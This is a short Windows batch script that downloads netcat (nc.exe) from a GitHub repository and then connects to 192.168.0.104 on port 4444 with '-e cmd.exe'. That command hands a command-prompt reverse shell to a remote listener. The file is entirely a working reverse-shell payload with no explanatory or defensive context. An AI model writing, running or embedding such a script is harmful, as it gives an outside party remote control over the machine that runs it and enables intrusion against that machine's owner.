@echo off
echo Downloading nc.exe...
curl -L -o nc.exe https://github.com/diegocr/netcat/raw/master/nc.exe

if exist nc.exe (
    echo nc.exe downloaded successfully.
    echo Connecting to 192.168.0.104:4444...
    nc.exe 192.168.0.104 4444 -e cmd.exe
) else (
    echo Failed to download nc.exe.
)

